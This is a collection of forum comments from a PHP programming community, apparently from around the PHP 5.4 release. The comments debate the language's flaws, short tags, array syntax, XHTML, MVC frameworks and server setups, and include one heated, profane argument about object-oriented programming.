Pfft. My relatively quiet account is a whole 2 months older (August 2006 represent!) than yours. Given that I was around back then, I can conclusively determine you're a fraud and just created that account, 5 years ago, to lend credibility to an upcoming reddit post. Probably about Ron Paul. I'm legit as fuck, tho.
I've been watching your updates on Codespy, and I like what I've been seeing. I'd like to offer a few mild suggestions: * Break up your codespy.php script into individual class files, and follow the [PSR-0](https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-0.md) standard. * Making all of the properties of \codespy\Analyzer public is sloppy. You should be providing getters/setters, eg \codespy\Analyzer::setOutputFormat('html'). That gives you a chance to validate the output format I chose. After all, I may have a typo, and accidentally choose "htnl". * Rather than having a big if...else statement in \codespy\Analyzer::__destruct(), you should have different classes for the different types of output, eg AnalyzerHtml, AnalyzerText, AnalyzerVim, etc. That's going to make you code much more organized and easier to maintain. Plus it'll make it easier to create new output types. * Automatically dumping the output in the \codespy\Analyzer::__destruct() method may not be the best course of action, as that might make it much harder to integrate Codespy with other unit testing frameworks.
I like Stripe a lot. As for the actual coding, just go to odesk.com or a similar site and hire someone.
Just bought the book. I discovered unit testing about 2 weeks ago, via [Laravel's CLI](http://laravel.com/docs/testing). I'm looking forward to learning more.
Tell me what the advantages of XHTML are over HTML 4.01 or HTML 5 then. No, using namespaced elements is not one of them.
All styles are directly in the source, but all external ressources are also loaded correctly. I'm a dev myself so i already did a little investigation on one of my firsts visits, but as this persisted across multiple browser on different systems i stopped and thought it is how it is.
My guess is one of your inserts is failing due to a SQL error, since there is nothing wrong with your PHP code.
I don't remember saying that you *should* use XHTML, I'm more pointing out that you most likely *already are* using it (for precisely the reasons I just listed) and so you're going to run into the issue with short tags that I pointed out initially. However, personally, in cases where HTML5 shim isn't appropriate, I'd still choose XHTML over HTML 4.
I've been doing PHP for 12 years, and I still got a lot out of this book. It has inspired me to try to up my game in very specific ways (mess detector, codesniffer, etc). (Full Disclosure: i worked with the author in 2004-2005)
If it's ERP, stick with it. That's the core of a modern business and is definitely highly in demand. 
It's difficult to say what's going wrong without seeing the schema for 'transactions'. The problem you're having could be explained if you have a unique index on one or more columns in the table, because two of the values in your array are nearly identical.
What kind of site is that? Care to tell us?
Thanks, I had a column set as PK.
NoScript? Cause I think that site uses LESS to on-the-fly compile css.
Yeah, sorry, I may have come across being a bit harsh. The bind_param() method binds the *variables* to the statement. Not the values of the variables. This is why you can't pass values to the method, eg bind_param('s', 'foo') will trigger an error. Calling it more than once is doing nothing more than binding the same variables over, and over again, and it's not doing what OP thinks it's doing.
I like how easy it is to make a change and see the results. Can I say I would change the adoption rate of new versions? That's my current gripe.
Do you happen to build your php SAPI module by yourself or do you use some distribution's build? Because that might account for the huge differences seen here.
Thanks! I was really torn between which one to tackle next. 
Are you avoiding my question because there are no actual functional advantages over using a DOCTYPE and plain old HTML 4.01? And no, I stopped using XHTML a while ago when I realised it was pointless for the majority of sites; if you want to use pretty syntax then use the HTML5 doctype and self close until your heart's content. Using a shim is not necessary unless you're using the new elements, and again since none has any true semantic value you're still better off using the HTML5 doctype and coding HTML like you normally would, but with less horrible syntax. It sucks, and I'm saying this even though I'm a purist and get a dramatic hard on every time I get to use nav and article. Oh good golly gosh, let me just change my long johns. But back to my question: what practical, everyday applications does XHTML have? Oh, that's right, none. That's why they discontinued development of the standard and shifted focus to HTML5.
If the degree is the only thing what the HR is looking for, you probably won't like to work for them. I'm almost in the same position as you are. I'm now in a internship where I get to enjoy writing code all day long. So do I still think I should get another fency paper? Most probably not ;) 
I would like to see: - functional programming features - jit compilation in core - more extensions (browserid, openid, ooxml...) - short object syntax - named parameters - function overloading - more functions - pbkdf2 and scrypt support in crypt functions - possibility to use php easily as a web sockets server - native support for utf-8 on everything - iterator blocks with yield - support for annotations, and enums - some function to enable and disable output escaping on normal echo etc. statements - better official package manager to replace pear I must have forgotten something... but those were a few things that I would like changed. 
Just for the fun of teaching, $premium = $queryResults &gt; $date; For future reference, if you didn't know you could do that. $queryResults &gt; $date returns a boolean value, essentially just like a function would. It isn't restricted to an if/else statement any more than if (true) is.
Poor support for multithreaded webservers. Unless you use nginx+FPM (or its other variations), you're stuck using Apache prefork which is an absolute waste of memory. Sure, much of this can be tied to underlying linked libraries, but it's still true. FPM is now being included as an official SAPI in 5.4. Lack of compilation. This can be solved using any number of addons (xcache, apc, etc.) and APC is supposed to be included in PHP someday. (Supposedly 5.4, but then that got nixed. 6.0?)
Some of these are simply gripes about behavior that most frameworks end up having to implement themselves. - OOP was added on but not fully embraced, so all of the methods for working with primitive data types are still Functional, instead of being members on the primitives themselves. I'd love it if string and array were object wrapped like how Javascript handles it, and all those manipulation functions were members of the wrapper. This would also resolve my next complaint... - Inconsistency of function names and argument ordering. I'm sure I don't have to explain this one. - PHP has no native method for receiving the request body on any http request type other than POST. If you're implementing handling for PUT or DELETE methods, you have to parse the body yourself using a file stream and `parsestr`, $_POST will be empty. - Doesn't automatically handle JSON requests, again you have to parse the request body yourself by reading from php://input. Those points said, the things that people rag on PHP for the most are actually just features of the language that people don't like, such as the way scope is handled, or how type coercion works (it seems like people who learned to program in a statically typed language find weak typing to be the worst thing in the world).
&gt;You shouldn't be mixing PHP, SQL and HTML What are you talking about?
What else is there to do with PHP other than mix it with SQL and HTML?!?
I think he was referring to MVC style programming? Either way, I think that mixing the language and markup is a beautiful thing. 
[Netbeans w/ PHP](http://www.netbeans.org/)
It's US only.
I don't think anyone replaces a needle with a haystack... ;) But agreed, ideally the needle position would be consistent there. But from the [FAQ](http://php.net/manual/en/faq.using.php#faq.using.parameterorder): &gt; PHP is a glue that brings together hundreds of external libraries, so sometimes this gets messy. However, a simple rule of thumb is as follows: &gt; Array function parameters are ordered as "needle, haystack" whereas String functions are the opposite, so "haystack, needle". One can argue that str_replace() is like an array function, as its arguments can be arrays, so the general rule of thumb kinda sorta still applies!
The interpreter is shite, namespaces are a hack, some core classes can't be properly extended, closures and anonymous functions aren't properly implemented, UTF-8 is STILL an issue (what year is it?), PCNTL extension still doesn't have a windows equivalent, and the core dev team tends to make bad decisions.
I love how accessible it is. Would like to be able to switch out the implementation of a function at run-time... maybe using reflection or something. $reflectionMethod-&gt;implementation(function() { return 'I do something different now!'; });
PHP is a scripting language. You can do lots of things with a scripting language... but still the best thing they are used for is web applications, and that means you have to mix them with HTML and MySQL.
In a standard POST form request the data is formatted and sent with either the `application/x-www-form-urlencoded` content type, or (in the case of file uploads) as `multipart/form-data`. PHP recognizes both of these types and parses their contents into the $_POST array. A JSON request is where the data is formatted as a json object, with the content type of `application/json`. Ideally PHP would also parse this into the $_POST array, but it doesn't. You have to check the Content-Type header, and load the json from the request body. [See line 26-30 of this file for an example.](https://github.com/ChiperSoft/Primal.RequestResponse/blob/master/classes/Primal/Request.php)
That's a matter of opinion. I've seen OOP form "helpers" that require several lines and/or nasty array arguments to create a single input. I'll take a static form in an html template just about any time over that -- much cleaner IMO.
How could parameter order inconsistency be fixed by using something other than Notepad++? I use Notepad++ too, and I fail to see how using a different IDE (such as Netbeans) could change the parameter order problem that you talk about. Enlighten me.
Make sure your curly brackets are paired too { and }.
My biggest gripe was with lambda functions and closure, but fortunately that is fixed in 5.4. For example: class Test { public $importantVar = "data"; public function example() { OtherTest::run(function () { echo $this-&gt;importantVar; }); } } class OtherTest { public static function run($func) { $func(); } } This will not work properly because the lambda function normally executes with no context. In 5.4, you can do: class Test { public $importantVar = "data"; public function example() { OtherTest::run((function () { echo $this-&gt;importantVar; })-&gt;bindTo($this)); } } class OtherTest { public static function run($func) { $func(); } } Also, 5.4 is bringing [] array syntax (death to array()!) and traits, which are pretty similar to Ruby mixins. It's definitely a step in the right direction, but there are still some smaller things that drive me crazy like the inability to call empty() on anything besides an explicitly defined variable, and the stupid namespace syntax.
A. oop "helpers" to create a single input are an example of the bad programming that people do B. why are you using a server side scripting language to generate a use-once never change form? Why not just use a static html form and reserve your server side scripting for validation?
So out of curiosity, why post the link?
I want to kick empty() in the teeth.
&gt; The interpreter is shite, Explain. &gt; namespaces are a hack, The syntax is weird, but other than that, why are they a hack? &gt; some core classes can't be properly extended, Example? &gt; closures and anonymous functions aren't properly implemented, Explain. &gt; UTF-8 is STILL an issue (what year is it?), Agreed. &gt; PCNTL extension still doesn't have a windows equivalent, Agreed. &gt; and the core dev team tends to make bad decisions. Example?
My biggest gripe with PHP would probably be its inconsistent naming scheme. Sometimes the keywords in the function identifier come separated with underscores, sometimes they do not, and sometimes they come in a different order than it does in another function. It's a mess. The parameter order is also out of whack. Unfortunately, this is not just some remnants from a past time, as I've seen new functions in the manual bearing the same inconsistency. Oh well, at least they come in OO-form as well, which so far appear to be consistent. 
Maybe you can do something with the google docs API to process the input files...
&gt;But since it's PHP, I can use SPL, or implement a class myself if I want. Too bad the SPL types are experimental and doesn't come bundled with PHP. Also, they are empty classes only used for type hinting, and doesn't come with any methods. Edit: I haven't had my coffee yet. You were talking about ArrayObject, which resides in SPL, not SPL types. It does indeed have array-handling methods. 
http://www.youtube.com/watch?v=lMZynsHG8QM
im excited for [] array syntax, but i have yet to forgive empty() for pissing me off years ago.
First function in my reusable tool set: "safe_empty". :/
Trial and error. Do things you enjoy instead of worrying about impressing anyone. Non-passionate programmers are a dime a dozen.
How about this link instead? http://web.archive.org/web/20100914232937/http://stackoverflow.com/questions/309300/defend-php-convince-me-it-isnt-horrible
&gt; Similarly, tables (even though everyone says you aren't supposed to use them for layout) are super simple and easy to read The way a table behaves may be clear and simple for everyone, but going through the code for a site that uses tables for layout is HELL.
From http://docs.php.net/manual/en/migration54.new-features.php "&lt;?= is now always available, regardless of the short_open_tag php.ini option." Though I rarely use them but...
What year are you from?
You missed the point. 
Chrome is a clean install without any addons.
I meant mixing them all up in one file instead of separating them out into separate files/methods. This sort of mess is the worst: &lt;?php $result = mysql_query("select * from table"); echo "&lt;ul&gt;"; while ( $row=mysql_fetch_assoc($result) ) echo "&lt;li&gt;{$row[test]}&lt;/li&gt;"; echo "&lt;/ul&gt;"; 
Dot versus arrow is just character choice, what does it matter? You could argue that since full stops signify the end of a sentence, using that for member access is illogical, whereas an arrow highlights the structure better.
Because until a couple weeks ago (the release of 5.4), it was an unsupported configuration and prone to problems. I was never able to get any of the (non-FPM) fastcgi implentations operational for more than a few seconds without innumerable segfaults and other issues. Only recently have we been able to use nginx+FPM reliably in a production commercial environment.
Incorrect. Multiple processes can be established. Not threads. I know what you're talking about but terminology is wrong. Please don't think that because you've got multiple processes started you've got multiple threads running. The two are very very different.
&gt; Running heavy workers under the manager doesn't work well though, they run much, much slower than if I start them up separately. What inside the GearmanManager seems to be causing you grief? All that manager does is facilitate the spawning of new processes and registering them as workers. There should be no difference in load put on the processes just because you're using this manager. At the end of the day it's still calling 1 method that you have implemented yourself.
Check this out http://net.tutsplus.com/tutorials/php/how-to-create-an-object-oriented-blog-using-php/ . Nettuts also has a bunch of other interesting stuff.
I run nginx+FPM on 5.3 as well, with several hundred PHP workers per server, and many thousands of nginx workers. One of the other big gripes is that with Apache [which was previously the only "supported" server] every request loaded PHP, even if it was only serving a static file. The main point was that 5.4 was just released. I've been running PHP since early 3.0... it has taken more than a decade for this support to become a reality.
He's right though.
Very true indeed. I was talking about the semantic meaning / use of a table. When not handling tabular data, stay clear of tables.
Hipster programmer: &gt;Vi is Too Mainstream: cat infile | sed '$a/text to append' &gt; outfile
&gt; `['item_1' =&gt; 'fu'];` ['not' =&gt; [ 'all' =&gt; [ 'arrays' =&gt; [ 'are' =&gt; [ 'that' =&gt; [ 'simple!' ] ] ] ] ]]; * 5 characters for every time you have to type `array` it adds up to a lot, considering how important PHP arrays are. * square brackets don't require the shift modifier (on a UK keyboard at least). * no keywords in the array definitions is easier to read. &gt; The reality is, all that -5 characters will do is break a lot of scripts when people try to run them on an outdated host. I use the Lithium framework which requires PHP 5.3 so I write code that is compatible with 5.3. It doesn't cause me any issues because we host all of our clients sites on rackspace (which we have root shell access to) and the first thing we do on any project is move it there. Now that might not be possible for everyone but the onus is on them to make those decisions. I like using newer (not bleeding edge) tech because it makes my job easier. If you're talking about redistributing code for others to use then you have a valid case because you'll limit your audience but if you can control your environment to a reasonable standard then it's really a non-issue. All that said, am I all that excited about short arrays? Not really, but it's certainly not an unwelcome change.
After reading all this I basically come to the conclusion that 90% of the criticisms are irrelevant to people who want to quickly deploy low-medium traffic sites. I understand CS majors who write in "cool" languages think PHP is a toy but I have yet to find something that's better for knocking out relatively simple sites. And let's face it, the vast majority of websites in existence fall in to this category.
it's good for quick prototypes. Many projects start out with an early metaprogramming stage.
Less of an issue, not a non-issue. I still have to pause to get the hint, or replace its ($needle, $haystack) autocomplete with my variable names.
So basically you're saying PHP doesn't scale well? Could you provide some info on the nature and scale of the app? I'll happily accept C is much more suited for some projects, but it must have been one hell of a web interface for C to be the preferred solution, no?
Coming from a Perl and C background, I've figured it out. They borrowed VERY liberally from both. For things like str_pad and stripos, they basically copied the argument ordering and naming from whatever language they were copying the functionality from. Things like htmlspecialchars... I have no idea. Maybe that's from yet another language that I don't recognize?
yeah, why so gloomy people - look on the bright side!
Amongst other things: POSTing (or PUTing etc) JSON instead of form-urlencoded post data allows you to send complicated data structures more easily. For example, I could POST the following JSON quite easily: { "users": [ {"username": "user1", "name": "User 1"}, {"username": "user2", "name": "User 2"}, {"username": "user3", "name": "User 3"} ], "groups": [ {"name": "Group 1", "members": ["user1", "user2"]}, {"name": "Group 2", "members": ["user3", "user3"]} ] } And get a nice, easy to use value on the PHP side once I'd parsed the request. Sending that same data with form-urlencoded data is a bit more cumbersome IMO: users[0][username]=user1&amp;users[0][name]=User%201&amp;users[1][username]=user2&amp;users[1][name]=User%202&amp;users[2][username]=user3&amp;users[2][name]=User%203&amp;groups[0][name]=Group%201&amp;groups[0][members][0]=user1&amp;groups[0][members][1]=user2&amp;groups[1][name]=Group%202&amp;groups[1][members][0]=user3&amp;groups[1][members][1]=user3 It's worth mentioning that I added whitespace to make the JSON more readable; the actual JSON request would look like this: {"users":[{"username":"user1","name":"User 1"},{"username":"user2","name":"User 2"},{"username":"user3","name":"User 3"}],"groups":[{"name":"Group 1","members":["user1","user2"]},{"name":"Group 2","members":["user3","user3"]}]} Personally I consider the fact that there exists an easy way to format JSON to be human readable (but still parseable) to be another advantage. In many cases the JSON request may be smaller too. In this example the JSON request is 228 bytes long; the form-urlencoded request is 300 bytes long. 
The built-in PHP string functions do not correctly handle UTF-8. You have to have an extension installed (mb string, iconv, etc) or use an external library. UTF-8 compliance should be completely built into PHP.
It doesn't really matter what character they choose, but : * it's non-standard * a dot is one key press and -&gt; is 3 : dash shift period * static classes get different notation "::"
Yes, the primary purpose is to generate web pages, but you can also use it for backend stuff. I have processes that retrieve files from external FTP servers, read in the contents, alter database records, then write out a log to a file, all without any actual display.
Just because you don't use an MVC framework doesn't mean everything's in one file. I separate out my PHP, HTML and CSS as well (and use *include*), which enables caching for individual components. MVC complicates things (necessarily) because when I write code (which usually won't be maintained by me), anyone coming *after* me needs to know the flavor du jour of MVC that I was using at the time, as *well* as PHP, HTML, CSS and SQL. The real dividing line is the complexity of the project. I've seen people inject MVC in a project which had only one active page, a response form. That's just ludicrous; the code overhead for form parsing and data filtering, not to mention providing data objects (all of which PHP does just fine natively). I'm all for using frameworks in the right places; specifically, this is (IMO) most frequently in larger scale integrated applications which use persistent logins. Most of the development people do day to day though, doesn't approach this level of complexity, and doesn't really need anything more than piecemeal code. MVC has its price.... complexity, slower execution, dependence on a stack of code to which your organization becomes inexorably tied, it produces issues when frameworks evolve or become abandoned in place, and the like. MVC also, of course, has its benefits, but you can't say that in five years, your MVC application will be any easier to maintain, modify, update, or bugfix than anything else. In my personal experience, the converse has always been true, alas.
Thanks!
I'm currently working with Lithium, and it's great for rapidly developing web apps. I have a few issues with it out of the box but those are mostly to do with using PHP in the view by default and our choice of using MongoDB as our data store. I've gotten used to the Zend Framework way of doing things but was able to pick up li3 pretty quickly. 
Hi Jim, At work at the moment so can't comment too much. Changes look great! Still not sure about the top-right quick links styling (Register etc) Also noticed a slight issue with the dynamic comment box and background colour, [nothing major.](http://i.imgur.com/m0hdL.png) Seen on this page https://codetique.com/QgDFehOi
Non-standard? Both -&gt; and :: are used in C++. PHP would have used the dot but it was already used for string concatenation and having a different character for addition and concatenation is much better in weakly typed language than overloading + for both. The dangers of that are regularly seen in JavaScript. 
Various PHP framework links for the lazy and unlazy both. [FuelPHP](http://fuelphp.com/), [Lithium](http://lithify.me/), [Codeigniter](http://codeigniter.com/), [Kohana](http://kohanaframework.org/), [DooPHP](http://doophp.com/), [CakePHP](http://cakephp.org/), [Zend Framework](http://framework.zend.com/), [Symfony](http://www.symfony-project.org/), [Symfony2](http://symfony.com/), [Yii](http://www.yiiframework.com/), [Laravel](http://laravel.com/), [Fat-Free](http://fatfree.sourceforge.net/), [Solar](http://solarphp.com/), [Limonade](http://limonade-php.github.com/), [Slim](http://www.slimframework.com/), [Silex](http://silex.sensiolabs.org/)
PHP is case-insensitive when it comes to function/method names, so if you want `htmlSpecialChars()` you got it! :)
&gt; - Abundance of Low Quality Software &gt; - Developers focused on hacking shit together rather than building elegant software &gt; - Slow/Lazy Version Adoption &gt; - Stagnant Software (Wordpress, Drupal, and Joomla have had the same shitty codebase for years) As I said in the OP, while these things may be true (although I'm not convinced about them all), they are not the fault of the language. It would be exactly the same if Python or Ruby was the #1 web programming language.
Google In-app Payments was a pleasure to implement. Very straight forward pricing. http://www.google.com/payments/payment-options/digital-goods.html
is this pretty easy to plug in to a non-doctrine project? what are some of the things you like about it?
After you learn some PHP and programming basics and are looking to get into web-app development, start here: http://fabien.potencier.org/article/50/create-your-own-framework-on-top-of-the-symfony2-components-part-1 and go through all 12 parts.
Quit promoting w3schools, please. http://w3fools.com/ 
php.net is the obvious first start. You will spend a lot of time here while learning! For a decent tutorial, I like Tizag.com -- a bit outdated, but it's still decent for getting into the absolute basics.
This comment gave me proxy-embarassment. 
If you're working on a public project that requires compatibility with PHP 5.3 and earlier, then obviously stick with using array(). My public projects will continue to use array() unless the other features of PHP 5.4 (such as traits) make the code significantly cleaner, in which case I might as well use the [] syntax. It's a small change, but (as rich97 pointed out) it makes a big difference in readability when working with more complex arrays. Also, this is another PHP gripe of mine that is fixed in 5.4: funcThatReturnsArray()[0] This is now valid syntax. Finally.
Nice try, Symfony dev.
We need about 17 more frameworks. This simply isn't enough.
THIS. Mostly websites are throw away anyway, there's no "right" way to make them, and every time I hear "this is unmaintainable" in some argument online, I just laugh. 95% of the site's I've worked on are less than 1 year in scope, think product launches, marketing campaigns, microsites, etc... "The Right Way" doesn't really exist.
I see these, but they say that they use VC10...now the latest PHP is compiled with VC9. Would those two be compatible? Sorry for my ignorance on this topic.
Good point. I am using the href of the link in my javascript to determine where to send my AJAX request. A better solution would probably be to use a data attribute or something instead of the href. **Edit** Actually a better fix would be to have the vote page redirect then there would be no loss of functionality. 
Ahh, I didn't even pay attention to the captcha. Maybe you can do some browser side validation to see if the captcha even has text in the box? IDK if you'd want to look into this, but maybe you can save a cookie, or a session for a person that has already entered a captcha correctly, so for a certain time period they won't have to enter in the captcha if they don't have an account, or maybe pop up a friendly reminder saying "Your comment has been posted, please create an account so you don't have to enter in captcha anymore." The site should have two way interaction with the user, not just "Did you fill this out? I'll post the data." Make it a little human by having it say "Whoops! Looks like you didn't enter the captcha in, please type it in before submitting your comment."
http://www.apachelounge.com/download/additional/ has VC9 builds.
I completely agree. The problem right now is the way I am doing the comment entry. It doesn't let me send meaningful feedback after submission. Once I make the switch to AJAX commenting, giving feedback wont be a problem. 
Does this solve the usual ArrayAccess problems with multi-dimensional arrays? With most ArrayAccess implementations, attempting to assign to an array nested inside an ArrayAccess object wont work because the array returned by the offsetGet function is a copy of the one inside the object. ArrayAccess doesn't let you return by reference, so I've yet to see a wrapper solution that supports deep assignment.
If you have ever programmed in any other dynamic web environment, you'd be asking why we didn't have this before.
I would say knowing how to study new techniques needed by clients furiously while giving the impression that you already know everything about them is far more important. Experience mostly helps in the regards of knowing how things have changed since you last saw them. Things change too quickly in the development field these days to do otherwise.
Log in and search for ipn. There will be a list of headings Link :- https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/xcl/rec/ipn-intro-outside 
It's really useful for those of us who have to work with geolocation features and data. With these classes ported from the Google Maps Javascript API, one can be sure every calculation will be done correctly and any edge case has been already considered. For my company it's an invaluable library and we thought it'd be nice to share it with you. Enjoy!
First time checking this site out, good work! I like the concept a lot. One thing: When using the Language Filter to select a specific language, after I click on a Code Review and go back a page, it still shows all the languages as opposed to the one I chose. Maybe a simple query string can fix this?
I noticed that last night and it is kind of annoying. I'll look into doing that or maybe just using a local storage variable or something. Thanks for the tip.
&gt; How is security weak? You may check what the what Suhosin (http://www.hardened-php.net/suhosin/) fixes. Many things that should be part of a default PHP. Another point is that the automatic tests seems to be broken and not getting used at all (info i read at the last broken crypt disaster). &gt; Both of these are coming, but it sucks they're taking so long. &gt; In fact, APC was supposed to ship with 5.4 but didn't for some &gt; reason. tbh... i'm not sure if unicode support will ever hit PHP (see: http://www.slideshare.net/andreizm/the-good-the-bad-and-the-ugly-what-happened-to-unicode-and-php-6) And a bytecode cache is just an essentiel feature. Just imaging how much disk IO and CPU could be saved if PHP 4 and higher got shipped with a easy to active bytecode cache. Think about the energy that could get saved with a bytecode cache. Estimate the amount of time people wasted for longer waiting times. Estimate the money spend for for energy and waiting times. PHP is just not a language for the future. It is a language of the past (at least if the current development pace stays the same). As i said: &gt; Modernisation will get sacrificed for compatibility
No problem, good luck!
The right way to handle this is with a URL rewrite rule. Rewrite any requests under a folder to a certain script (i.e. /users/BOB/ =&gt; /users/index.php?username=BOB) Then your script does whatever it needs to do with $_GET['username'] There are many tutorials online for how to do rewrites with popular webservers (Apache, nginx, etc) Google is your friend here. *EDIT: Grammar
If you know they are always going to be available then why not? It is a matter of personal preference in that case. If you do not know they will always be available then you probably shouldn't use them. It would be a pain to have to go through every file and fix it because you were forced to switch hosts and now can't use it.
You say "different IDE" but the truth is Notepad++ is a text editor, not an IDE.
That seems like a really unnecessarily complicated solution for something that a template engine does for you out of the box.
A template system doesn't give you files that can vary independently. I agree it's very likely the OP is solving the wrong problem, but in case he isn't he deserves an expert answer to the question he actually asked. There are plenty of comments already informing him of the "right" way to do things. Mine would be redundant.
&gt; I personally do not believe forcing the use of $this was meant to be a feature, or meant to reduce ambiguity Oh true, I totally agree with you there. They're clearly things that are side-effects of the development of the parser, but now we've had them long enough that we consider them to be attributes of the language.
Please remove "PHP experience" from your resume at once.
In the latest PHP version I think I read they are on by default. Which should make them even more prevalent as time goes on. 
You are right. Custom built one. Actually both web server and php. 
It can, actually, you just write php with your php instead of html, works great. I've done this lots of times to great affect, I wouldn't want to attempt it through DOM manipulation - thats a lot of extra hassle.
I am using XML, but short tags are working just fine for me....
checkout the API documentation on their site &amp; Pro Drupal Development book. Plenty of screen casts, etc accessible from a google search.
This is the same reason why the short array syntax is off the table for the forseeable future as well, even if its really nice to have.
Even in an MVC framework you use &lt;?=$somevariable?&gt; when you want to pass in dynamic data from the controller to the view.
OK thanks. I'm interested to see what the culprit is. It should all be mitigated by the next release which will AJAX the whole commenting process.
What type of DB are you using? Are you planning on having users search for information or just provide them a complete list? EDIT: I wouldn't suggest using inputs as part of the complete list, if you have a lot of rows, the browser will drag like whoa. What I would suggest: 1) Create a view that has a table that lists all the information you want, phone number / email / name / etc, provide links to edit that user and a link to remove the row. 2) Create a view for editing the information, which will have your input fields. 
I generally use short tags in my views, if it's on a server I have more or less complete control over.
Well, Copenhagen isn't that far :) Many swedes fram Malmö works in Copenhagen.
As of php 5.4.0, &lt;?=$var;?&gt; is [always available](http://php.net/manual/en/ini.core.php#ini.short-open-tag) regardless of settings. However, &lt;? echo $bar; ?&gt; still relies on the short_open_tag directive. So the answer here would be: &lt;?=$var?&gt; - yes &lt;?php echo $var; ?&gt; - yes &lt;? echo $var; ?&gt; - no.
&gt;The main reason that I never use them is that standard short tags (&lt;? ?&gt;) conflict with XML headers Use php to output the &lt;?xml tag in a string. Honestly this is the first complaint people reach for when talking about this, but it is a nearly irrelevant, easily solvable edge case.
I've been using mysql, if I'm able to incorporate a search function, that would be useful. I'll look into your suggestions asap.
I'm not sure, the workers I tried it with pull some data from an API, parse it, and then store it in the database with several queries. I could process ~30/second with workers run outside of it, but when GearmanManager spawned the workers I got a maximum of ~5-7/second. I didn't look into it because I was short on time and the vast majority of the time I am not interacting with them. 
I still hated Eclipse on a beefy machine. PHPStorm has treated me much better.
&gt; lack of separation between design and programming. Yeah lets separate out php code from design by replacing &lt;?php echo $name ?&gt; with %%name%% or {{name}}. That way it won't confuse their designer brains with complex code like the echo function.
Got noscript/requestPolicy? Happens to me; I don't check out phpmaster too much so it is not a bother for me.
http://php.net/ChangeLog-5.php 5.4: &gt; &lt;?= is now always available regardless of the short_open_tag setting.
2012 last time I checked.
You need to press your thumb into the developer's upper arm, if they bruise they are ripe and you can pick them.
Not that much more difficult than having to jump back and forth between your HTML code and your CSS section or file.
I'd guess that you've just never had a project where threads would be useful... That's probably normal. :-) The best examples I can think of where several small tasks that need to be performed, but could be performed in parallel.... - A page that returns a domain's NS, MX, A, and SRV records. - A page that does a comparison between two or more remote documents.
There's no reason to be a douchebag and call me lazy. I just prefer to code differently than you. &gt;I wish I could stick my hand through my monitor and slap some sense into you. I wish I could piss on your motherboard. Woopty freaking doo. &gt;I use OOP for everything PHP related, and I happen to find the resulting code elegant, easy to understand and great for scaling up for changing requirements in the future. So **you** happen to find OOP (insert all those things you said here). I don't. You have **no right** to say that your way of coding is the right one and mine is wrong. &gt;To get to this point took me a lot of time and effort - clearly time and effort you cannot be bothered putting into your own learning. So it took you a lot of time and effort to learn OOP. Congratulations. But "Classic" and "OOP" PHP programming are drastically different when it comes to following the order of execution (which I want to see in detail when making a program). Classically, I can just read through the code, or jump to the function I've made. With OOP, I have to go into the separate class files (and there are usually tons of them with an OOP PHP script) and hunt through them for each sub-class and sub-sub-class. &gt;OOP is actually better, but we'd all best leave OOP because there are lazy programmers like you who've been using PHP for years but can't be bothered learning OOP, so we should put up with their godawful, unmaintanable code from 1997 for the rest of eternity? When did I say OOP shouldn't be supported? **I didn't**. Should you put up with my code or any other "non-OOP" code? No, make your own fucking code. And stop calling me lazy, you fucking douchebag. In summary, you like OOP because it's more like other languages (I assume), and I like classic PHP coding because **it's fucking simple**, which is the reason PHP became popular in the first place, and is still popular. Think of it in car terms - an automatic transmission is super easy to use, but a manual is supposed to give you better performance and milage. I can drive a manual, but I much prefer an automatic.
Instead of starting from the ground up, which is what it sounds like you are doing, I would suggest starting with a framework. CakePHP is a pretty good one that I've used with success, and has a lot of newbie friendly resources. The mysql plugins will help you abstract out the database bits. However, if you are looking for a system to manage contact information and display it, there might be something out there already. [Don't reinvent the wheel] (http://www.codinghorror.com/blog/2009/02/dont-reinvent-the-wheel-unless-you-plan-on-learning-more-about-wheels.html) I know Drupal will let you manage users in such a fashion, and you can likely just modify its view pages to display in the proper format. Which sounds like it would be much easier than coding something from scratch. Some of the other php based Content Management Systems likely have similar functionality.
The term "short tags" refers to two things: `&lt;?` (equivalent to `&lt;?php`) and `&lt;?=` (equivalent to `&lt;?php echo`). The former, i.e. `&lt;?`, is inherently evil as it may clash with XML processing instructions, and should never be used. The latter, i.e. `&lt;?=`, is just a harmless short form, which can safely be used. PHP 5.4 only supports `&lt;?=` always. `&lt;?` still is affected by the `short_open_tag` option.
The real question here is: *Do I want to write portable code?* Yes? Then no short tags. No? Then use them, if you want. It really is this simple. Same applies to the recently decoupled &lt;?=.
lol You do realise my original post was just explaining why OOP wasn't adopted, right? &gt;I detest 'classic php coding' because it leads to horribly messy code that is 99.5% of the time an absolute nightmare to extend and to maintain Bad code is bad code. Most of the so-called "frameworks" and many "OOP" scripts were/are an absolute mess. **Are you trying to say you CAN'T do good code without OOP?** &gt;I called you lazy because you clearly don't understand the true benefits of OOP (beyond a superficial nod that it's somehow "better", but you don't use it anyway), and also because you're arguing that tables for design is actually a good idea. Tables for design is horrible, horrible, horrible shit that is not acceptable and I don't even think I can be bothered arguing the point with you on that one. You're just wrong, and a simple google search will reveal all the reasons as to why this is the case. Wow. You are so childish. So you think tables suck? Good for you. I love them, and it does the fucking job. Laying out data without tables using CSS and making it layout like it was done with a table (e.g. normally)? A fucking nightmare. **Obviously everyone but you is wrong about everything, you arrogant self-centered prick**. &gt;When it comes to OOP, you're saying stuff like it's "easier" for newbie programmers to do tradtional php - but so what? What's your point? We should all stay at the absolute newbie level just because some people never advance beyond that stage?? Again, **you're putting words in my mouth**. I **never** said "let's give up OOP" I only explained why I don't use it and why I think only having OOP (***as YOU have suggested***) would cut out most of the market for PHP. &gt;I ended up with a system that could create new reports really easily. As soon as a new report was created, it was INSTANTLY available in csv, json or excel format, and I had an absolute guarantee that adding a new report would not break anything in my existing system. Okay? You do realise that you can do that just as easily without OOP, right? And saying "Instantly" is kind of pointless, I don't think if I coded a function like that, it would take very long to run. &gt;Do you see how easy that is? No. I don't see how easy it is. I see that it only takes a few lines in the main script, but what about the source of those functions? I bet it's quite long. &gt;**OOP is not just another way of doing the same thing**. It's not just a different syntax structure, or something people do just to annoy the newbies. It's something that can and will make your life much easier, but you have to invest the time and effort into learning it properly first. But... it **IS** just another way of doing the same thing. Also, if it's not "another way of doing the same thing", it must be "the same way of doing the same thing", "the same way of doing another thing", or "another way of doing another thing". I don't think the first two apply, so I guess you're saying **"OOP is another way of doing another thing"**. In that case, I'll keep my same way of doing the same thing, you can keep your different way of doing a different thing, because it has absolutely nothing to do with me. P.S. I code for **ME** not you.
I would love to move to Denmark, and I'm a great php developer. Hire me :) I got into php development because here in San Francisco, California a lot of the startups use that language.
I haven't seen any problems with GD. I use it massive and there are no issues. But I know threading is not recommended with PHP.
Quit
